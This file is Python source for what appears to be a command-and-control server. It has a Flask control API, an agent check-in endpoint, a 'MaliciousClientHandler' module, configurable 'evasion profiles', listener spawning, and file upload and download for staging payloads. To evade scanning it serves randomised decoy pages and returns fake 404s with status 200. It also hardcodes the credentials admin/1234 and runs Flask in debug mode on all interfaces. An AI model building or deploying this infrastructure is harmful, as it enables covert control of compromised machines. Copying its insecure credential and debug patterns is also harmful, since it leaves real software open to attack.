#!/bin/python3
try:
    import subprocess as sp
    import socket
    import threading
    #import time
    import os
    #import sys
    import random
    import atexit
    from datetime import datetime, timezone
    import logging
    import argparse
    import threading
    import traceback
    import ssl
    import inspect
    import asyncio
    import signal
    import sys
    import time
    from flask import Flask, jsonify, request, send_from_directory


    # My Modules
    import tcp_listener
    import DataEngine.JsonHandler as json_parser
    import DataEngine.JsonHandler
    import DataEngine.DataDBHandler
    #from DataEngine.RSAEncryptionHandler import Encryptor ##  Not needed, switching to SSL
    import ClientEngine.ClientHandler
    import ClientEngine.MaliciousClientHandler
    import SecurityEngine.AuthenticationHandler
    import Comms.CommsHandler
    import Utils.UtilsHandler
    import Utils.KeyGen
    import ApiEngine.ConfigHandler
    import Utils.DataObjects

    ## Error modules
    import ApiEngine.ErrorDefinitions
    import Utils.ErrorDefinitions

except Exception as e:
    print(f"[server.py] Import Error: {e}")
    exit()

"""
Argparse settings first in order to be able to change anything
"""
parser = argparse.ArgumentParser()
parser.add_argument('--ip', help="The IP to listen on (0.0.0.0 is a good default", required=True)
parser.add_argument('--port', help="The port to listen on", required=True)
parser.add_argument('--quiet', help="No output to console", action='store_true')
parser.add_argument('--fileserverport', help="what port for the file server", default=80)
parser.add_argument('-c', '--generatekeys', help="ReGen Certs & Keys", action="store_true")
parser.add_argument('--evasionprofile', help="The evasion profile", default="/EvasionProfiles/default.yaml")
parser.add_argument('--apiconfigprofile', help="The API config profile", default="Config/ApiSchemas/default.yaml")

## Globals bad. I know
args                = parser.parse_args()
ip                  = args.ip
port                = int(args.port)
quiet               = args.quiet
fileserverport      = args.fileserverport
generate_keys       = args.generatekeys
evasion_profile     = args.evasionprofile
api_config_profile  = args.apiconfigprofile
sys_path = os.path.dirname(os.path.realpath(__file__))
function_debug_symbol = "[^]"

"""
Here's the global Debug + Logging settings. 
Global Debug print to screen will be a setting in the future
"""
if not quiet:
    global_debug = True
else:
    global_debug = False
    
##Reference: https://realpython.com/python-logging/
logging.basicConfig(level=logging.DEBUG)
## Change the path to the system path + a log folder/file somewhere
logging.basicConfig(filename='server.log', filemode='a', format='%(asctime)s - %(levelname)s - %(message)s', force=True, datefmt='%Y-%m-%d %H:%M:%S')
if global_debug:
    logging.getLogger().addHandler(logging.StreamHandler())


class Data:
    '''
    Initizaling the data objects. See documentation for more info &
    justification on why these exist

    These are singletons, so only one instnace will/should ever be created

    call will Data.varname
    '''
    ## Path Struct
    path_struct = Utils.DataObjects.PathStruct()
    path_struct.sys_path = sys_path


    ## Getting all the paths in the log just in case something fails/is off
    logging.debug(f'[*] PathStruct.sys_path: {path_struct.sys_path}')

class ListenerController:
    '''
    A class that takes care of the listeners, spawns them, etc.
    '''

    @staticmethod
    def spawn_listener(ip="127.0.0.1",port=80):
        '''
        Spawns a listener class. 

        ip (str): The IP to listen on.
            0.0.0.0 for any interface
            127.0.0.1 for localhost

        port (int): The port to listen on
        '''
        try:
            new_listener = tcp_listener.ServerSockHandler(
                ip = ip,
                port = port,
                evasion_profile = evasion_profile,
                function_debug_symbol="[^TCP_LIST]"
            )
            new_listener_thread = threading.Thread(target=new_listener.start_server)
            #new_listener_thread.daemon = True
            new_listener_thread.start()
        
        except Exception as e:
            logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")
            logging.warning(f"(temp) Error: {e}")

## Move to own file eventually
class ControlServer:
    app = Flask(__name__)
    config_file_path = Utils.UtilsHandler.load_file(current_path=sys_path, file_path=api_config_profile)
    UrlSc = ApiEngine.ConfigHandler.UrlSchema(api_config_profile=config_file_path)
    UrlSc.load()

    @app.route("/", methods=["GET"])
    @app.route(f"/{UrlSc.HOME_BASE}", methods=["GET"])
    def no_subdir():
        try:
            # Yaml load code here
            ## load random choice from list
            html_file_path = random.choice(ControlServer.UrlSc.HOMEPAGE_LIST)

            # open file
            html = Utils.UtilsHandler.load_file(
                current_path = sys_path, 
                file_path = html_file_path, 
                return_path = False )
            # return HTML
            return html
            ## oh my god it worked on the first time

        except Exception:
            ControlServer.page_not_found()
    
    ## for agents checking in
    @app.route(f"/{UrlSc.AGENT_BASE_ENDPOINT}", methods=["GET"])
    def agent_base():
        return "agent_base"
    
    ## login
    @app.route(f"/{UrlSc.SERVER_LOGIN_ENDPOINT}", methods=["GET"])
    def server_login():
        if SecurityEngine.AuthenticationHandler.Authentication.authentication_eval(
            username="admin",
            password="1234",
            path_struct=Data.path_struct
        ):
            return "placeholder success"
        
        else:
            return "placeholder failure"

    # commands to control the server
    @app.route(f"/{UrlSc.SERVER_BASE_ENDPOINT}", methods=["GET"])
    def server_base():
        return "server_base"
    
    ## Listener Section
    @app.route(f"/{UrlSc.SPAWN_TCP_LISTENER_ENDPOINT}", methods=["POST"])
    def add_todo():
        try:
            # Extract JSON data from the request body
            data = request.json

            ## validate JSON

            ListenerController.spawn_listener(ip = data["ip"], port = data["port"])

            return jsonify({"message": "success"})
        except Exception:
            ControlServer.page_not_found()

    ## File Section
    # https://docs.faculty.ai/user-guide/apis/flask_apis/flask_file_upload_download.html
    # by default, http://ip/files/FILENAME
    @app.route(f"/{UrlSc.UPLOAD_BASE_ENDPOINT}/<path:path>", methods=["GET"])
    def download_file(path):
        try:
            ## as attachment downloads it, instead of displaying in browser
            return send_from_directory(ControlServer.UrlSc.UPLOAD_FOLDER, path, as_attachment=True)
        except Exception as e:
            #print(e)
            return ControlServer.page_not_found()

    @app.route(f"/{UrlSc.UPLOAD_BASE_ENDPOINT}/<filename>", methods=["POST"])
    def post_file(filename):
        """Upload a file."""

        if "/" in filename:
            # Return 400 BAD REQUEST
            return "No Subdirectories allowed", 400
        
        Utils.UtilsHandler.write_file(
            current_path=sys_path,
            file_path=ControlServer.UrlSc.UPLOAD_FOLDER + "/" + filename,
            data = request.data
        )

        # Return 201 CREATED
        return "", 201

    @app.errorhandler(403)
    @app.errorhandler(404)
    def page_not_found(e=None):
        '''
        Handles all 40X & any try/except errors. Basically it returns a 200
        with a "page not found"

        This is done for security/scraping/URL discovery reasons
        
        '''
        try:
            err_404_path = random.choice(ControlServer.UrlSc.NOT_FOUND_LIST_404)

            html = Utils.UtilsHandler.load_file(
                current_path = sys_path, 
                file_path = err_404_path, 
                return_path = False )
            return html, 200
        ## Fallback for if something breaks
        except:
            return "", 200


if __name__ == "__main__":
    ## Init data structures
    Data()
    ControlServer.app.run(host="0.0.0.0", port=5000, debug=True)
    #while True:
        #ListenerController.spawn_listener()
        #time.sleep(100)


'''
Daemon notes. It runs threads in the background, as long as the program is still executing, i.e. in a loop of some sorts.


Some things to think about.
    - Should the client connect here? This would give it control over each listener, vs controlling one at a time
    - Should I jsut bite the bullet and switch to an API based control scheme?
'''